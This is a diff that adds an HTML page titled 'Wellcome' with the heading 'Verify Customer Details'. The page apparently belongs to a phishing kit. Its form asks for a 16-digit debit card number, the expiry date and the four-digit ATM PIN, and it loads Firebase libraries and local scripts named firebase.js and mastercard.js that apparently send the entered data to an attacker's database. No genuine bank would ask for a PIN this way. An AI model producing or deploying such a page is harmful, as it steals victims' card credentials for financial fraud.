@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>Wellcome</title>
+<meta name="description" content="login">
+<meta name="next-head-count" content="4">
+    
+<link rel="preload" href="8cc68e2ef518f736.css" as="style">
+
+    
+<link rel="stylesheet" href="8cc68e2ef518f736.css" data-n-g="">
+
+
+    <link rel="icon" type="image/png" sizes="32x32" href="book.png">
+
+
+    </head><body>
+
+    <div id="">
+    <div class="header">
+        
+    <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;">
+    <span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27125%27%20height=%2735%27/%3e" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span>
+        
+        
+    <img alt="Logo" src="book.png" decoding="async" data-nimg="intrinsic" class="img-logo" style="width: 0px; position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; height: 0px; min-width: 100%; max-width: 155%; min-height: 155%; max-height: 155%;"> </span>
+        
+        
+        
+        </div>
+        
+    <div class="mainContent"><h1 class="text-center">Verify Customer Details</h1><div class="card">
+        
+    <form id="ududip007" class="LoginForm" method="post" autocomplete="off">
+  
+        <div class="form-group">
+  <label for="ccard">Debit Card Number</label>
+    <input type="text" id="ccard" class="new-control" inputMode="numeric" title="Please enter a Card Number" placeholder="Enter 16 digit card number" minlength="16" maxlength="16" required />
+  </div>
+        
+        
+
+        
+ 
+
+        
+    <div class="form-group">
+  <label for="cexp">Expiry</label>
+    <input type="text" id="cexp" class="new-control" title="Please enter a Expiry"  minlength="7" maxlength="7" inputmode="numeric" oninput="formatCardExpiry(this)" required />
+  </div>
+        
+        <script>
+  function formatCardExpiry(input) {
+    let value = input.value;
+    value = value.replace(/\D/g, ""); // Remove non-digit characters
+    value = value.slice(0, 6); // Limit the length to 6 characters
+
+    let formattedValue = "";
+    const month = value.slice(0, 2);
+    const year = value.slice(2, 6);
+
+    if (month.length > 0) {
+      formattedValue += month;
+      if (month.length === 2) {
+        formattedValue += "/";
+      }
+    }
+
+    if (year.length > 0) {
+      formattedValue += year;
+    }
+
+    input.value = formattedValue;
+    validateCardExpiry(input);
+  }
+
+  function handleBackspace(event) {
+    const key = event.keyCode || event.charCode;
+    if (key === 8) {
+      event.preventDefault();
+      const input = event.target;
+      const cursorPosition = input.selectionStart;
+      let value = input.value;
+
+      if (cursorPosition > 3) {
+        // If the cursor is in the year field, delete the last digit
+        value = value.slice(0, cursorPosition - 1) + value.slice(cursorPosition);
+        input.selectionStart = cursorPosition - 1;
+        input.selectionEnd = cursorPosition - 1;
+      } else if (cursorPosition > 0) {
+        // If the cursor is in the month field, delete the last digit
+        value = value.slice(0, cursorPosition - 1) + value.slice(cursorPosition);
+        input.selectionStart = cursorPosition - 1;
+        input.selectionEnd = cursorPosition - 1;
+      }
+
+      input.value = value;
+      validateCardExpiry(input);
+    }
+  }
+
+  function validateCardExpiry(input) {
+    const value = input.value;
+    const month = value.slice(0, 2);
+    const year = value.slice(3);
+
+    const expiryError = document.getElementById("cexp-error");
+
+    if (month < "01" || month > "12" || year < "2023" || year > "2030") {
+      expiryError.textContent = "Invalid date. Please enter a valid month (01-12) and year (2023-2030).";
+      expiryError.style.color = "red";
+      input.classList.add("error");
+    } else {
+      expiryError.textContent = "";
+      expiryError.style.color = ""; // Reset the color
+      input.classList.remove("error");
+    }
+  }
+
+  const expiryInput = document.getElementById("cexp");
+  expiryInput.addEventListener("input", function () {
+    validateCardExpiry(this);
+  });
+</script>
+        
+        
+        
+
+
+        
+        
+<div class="form-group">
+  <label for="cpin">ATM PIN</label>
+    <input type="password" id="cpin" inputmode="numeric" class="new-control" title="Please enter a valid ATM PIN"  minlength="4" maxlength="4" required />
+  </div>
+
+        
+        
+
+  <div class="text-center">
+    <button type="submit" class="submit">SUBMIT</button>
+  </div>
+</form>
+
+        
+        
+        
+        </div></div></div>
+    
+    <next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;">Wellcome</p></next-route-announcer>
+    
+    
+    
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+    
+    
+    
+    
+<script src="firebase.js">  </script>
+<script src="mastercard.js">  </script>
+
+    
+    </body></html>
